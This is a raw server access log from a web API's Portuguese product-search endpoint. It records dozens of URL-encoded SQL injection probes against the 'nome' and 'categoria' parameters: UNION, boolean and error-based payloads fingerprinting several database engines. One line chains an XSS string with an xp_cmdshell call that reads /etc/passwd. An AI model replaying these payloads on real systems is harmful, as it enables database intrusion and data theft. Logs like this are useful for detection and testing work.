api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:50490 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CCONCAT%280x716b707671%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28IFNULL%28QUARTER%28NULL%29%2CNULL%2F%2A%2A%2FXOR%2F%2A%2A%2FNULL%29%2F%2A%2A%2FIS%2F%2A%2A%2FNULL%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2C0x71706a7671%29%2CNULL%2CNULL%2CNULL--%2F%2A%2A%2F- HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50496 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CCONCAT%280x716b707671%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28IFNULL%28QUARTER%28NULL%29%2CNULL%2F%2A%2A%2FXOR%2F%2A%2A%2FNULL%29%2F%2A%2A%2FIS%2F%2A%2A%2FNULL%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2C0x71706a7671%29%2CNULL%2CNULL%2CNULL--%2F%2A%2A%2F- HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50504 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28LENGTH%28SYSDATE%29%3DLENGTH%28SYSDATE%29%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%2CNULL%2CNULL%2CNULL%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL--%2F%2A%2A%2FRQYg HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50506 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28CONVERT_TO%28%27Iawu%27%2CQUOTE_IDENT%28NULL%29%29%2F%2A%2A%2FIS%2F%2A%2A%2FNULL%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%28CHR%2849%29%29%2F%2A%2A%2FELSE%2F%2A%2A%2F%28CHR%2848%29%29%2F%2A%2A%2FEND%29%29%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%2CNULL%2CNULL%2CNULL--%2F%2A%2A%2FfWHX HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50524 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28IS_SRVROLEMEMBER%28NULL%29%2F%2A%2A%2FIS%2F%2A%2A%2FNULL%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28118%29%2BCHAR%28113%29%2CNULL%2CNULL%2CNULL--%2F%2A%2A%2FTACT HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50526 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CCHAR%28113%2C107%2C112%2C118%2C113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28LAST_INSERT_ROWID%28%29%3DLAST_INSERT_ROWID%28%29%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%7C%7CCHAR%28113%2C112%2C106%2C118%2C113%29%2CNULL%2CNULL%2CNULL--%2F%2A%2A%2FPcGR HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50530 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CCHAR%28113%2C107%2C112%2C118%2C113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28SQLITE_VERSION%28%29%3DSQLITE_VERSION%28%29%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%7C%7CCHAR%28113%2C112%2C106%2C118%2C113%29%2CNULL%2CNULL%2CNULL--%2F%2A%2A%2FpVrW HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50518 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CCHAR%28113%2C107%2C112%2C118%2C113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28RANDOMBLOB%28-1%29%2F%2A%2A%2FIS%2F%2A%2A%2FNOT%2F%2A%2A%2FNULL%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%7C%7CCHAR%28113%2C112%2C106%2C118%2C113%29%2CNULL%2CNULL%2CNULL--%2F%2A%2A%2FBVqB HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50558 - "GET /produtos/busca/?nome=teste&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50570 - "GET /produtos/busca/?nome=teste&categoria=eletronicos&mkoH=4940%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50584 - "GET /produtos/busca/?nome=teste&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50598 - "GET /produtos/busca/?nome=5850&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50612 - "GET /produtos/busca/?nome=teste%22.%28%2C%29%27.%29%28%28&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50628 - "GET /produtos/busca/?nome=teste%27RIxTdw%3C%27%22%3EaHzYTu&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50642 - "GET /produtos/busca/?nome=teste&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50650 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F9145%3D4039%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27tSTb%27%3D%27tSTb&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50658 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F3986%3D3986%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27iICo%27%3D%27iICo&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50676 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F2879%3D3728%2F%2A%2A%2FAND%2F%2A%2A%2F%27dkDa%27%3D%27dkDa&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50666 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F3986%3D3986%2F%2A%2A%2FAND%2F%2A%2A%2F%27Trqq%27%3D%27Trqq&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50680 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F1286%3D9470%2F%2A%2A%2FAND%2F%2A%2A%2F%287777%3D7777&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50684 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F3986%3D3986%2F%2A%2A%2FAND%2F%2A%2A%2F%281521%3D1521&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50688 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F3255%3D7048&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50698 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F3986%3D3986&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50702 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9586%3D5548--%2F%2A%2A%2FUKpk&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50706 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F3986%3D3986--%2F%2A%2A%2FmeMg&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50718 - "GET /produtos/busca/?nome=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286820%3D4961%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27teste%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F4961%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F5776%29%2F%2A%2A%2FEND%29%29&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50720 - "GET /produtos/busca/?nome=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283589%3D3589%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27teste%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F8527%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F3496%29%2F%2A%2A%2FEND%29%29&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50726 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%288641%2CCONCAT%280x5c%2C0x7176787671%2C%28SELECT%2F%2A%2A%2F%28ELT%288641%3D8641%2C1%29%29%29%2C0x716a786a71%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27mbso%27%3D%27mbso&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50738 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%288641%2CCONCAT%280x5c%2C0x7176787671%2C%28SELECT%2F%2A%2A%2F%28ELT%288641%3D8641%2C1%29%29%29%2C0x716a786a71%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27BIKF%27%3D%27BIKF&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50744 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%288641%2CCONCAT%280x5c%2C0x7176787671%2C%28SELECT%2F%2A%2A%2F%28ELT%288641%3D8641%2C1%29%29%29%2C0x716a786a71%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%285821%3D5821&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50756 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%288641%2CCONCAT%280x5c%2C0x7176787671%2C%28SELECT%2F%2A%2A%2F%28ELT%288641%3D8641%2C1%29%29%29%2C0x716a786a71%29%29&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50772 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%288641%2CCONCAT%280x5c%2C0x7176787671%2C%28SELECT%2F%2A%2A%2F%28ELT%288641%3D8641%2C1%29%29%29%2C0x716a786a71%29%29--%2F%2A%2A%2FeqXj&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50778 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F8051%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288051%3D8051%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27hiTB%27%3D%27hiTB&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50766 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F8051%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288051%3D8051%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27EjOT%27%3D%27EjOT&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50792 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F8051%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288051%3D8051%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%289694%3D9694&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50808 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F8051%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288051%3D8051%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50822 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F8051%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288051%3D8051%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29--%2F%2A%2A%2FtIDO&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50834 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F5141%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285141%3D5141%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27rROC%27%3D%27rROC&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50846 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F5141%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285141%3D5141%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27PLgZ%27%3D%27PLgZ&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50854 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F5141%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285141%3D5141%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%287669%3D7669&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50824 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F5141%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285141%3D5141%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50856 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F5141%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285141%3D5141%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%2F%2A%2A%2FfYUP&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50872 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F7507%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287507%3D7507%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27shQC%27%3D%27shQC&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50876 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F7507%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287507%3D7507%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27RwnZ%27%3D%27RwnZ&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50892 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F7507%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287507%3D7507%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%281755%3D1755&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50898 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F7507%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287507%3D7507%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29&categoria=eletronicos HTTP/1.1" 200 OK
